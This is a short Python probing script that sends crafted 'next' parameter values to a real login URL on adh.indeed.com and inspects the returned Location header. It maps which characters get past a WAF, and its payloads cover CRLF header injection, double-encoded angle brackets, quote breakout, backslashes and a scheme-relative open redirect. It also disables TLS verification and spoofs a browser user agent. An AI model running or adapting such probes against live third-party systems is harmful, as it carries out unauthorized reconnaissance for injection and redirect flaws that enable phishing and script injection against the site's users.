"""Inspect the raw Location after the app percent-decodes it once.
If the app decodes then re-emits the value into a header, a boundary char can
still break out -- but only if something downstream renders it as HTML.
"""
import requests
import urllib3
from urllib.parse import quote, urlsplit, unquote

urllib3.disable_warnings()
UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/126.0 Safari/537.36"}

BASE = "https://adh.indeed.com/user/login?next="

# characters the WAF allows, one at a time, to map the app's own encoding
for name, raw in (
    ("plain",        "zqaaa111"),
    ("lt",           "zqaaa111<"),
    ("quote-close",  'zqaaa111"'),
    ("spaces",       "zqaaa111 x"),
    ("crlf",         "zqaaa111%0d%0aX:y"),
    ("double-enc-lt", "zqaaa111%253C"),
    ("scheme-rel",   "//example.org/x"),
    ("backslash",    "zqaaa111\\"),
):
    url = BASE + quote(raw, safe="")
    try:
        r = requests.get(url, timeout=20, verify=False, headers=UA,
                         allow_redirects=False)
        loc = r.headers.get("Location") or ""
        dec = unquote(loc)
        print(f"{name:14} {r.status_code}")
        print(f"   raw loc : {loc[:120]}")
        if dec != loc:
            print(f"   decoded : {dec[:120]}")
        print(f"   next hop: {urlsplit(loc).hostname or '(relative)'} {loc[:60]}")
    except Exception as e:
        print(f"{name:14} ERR {type(e).__name__}")
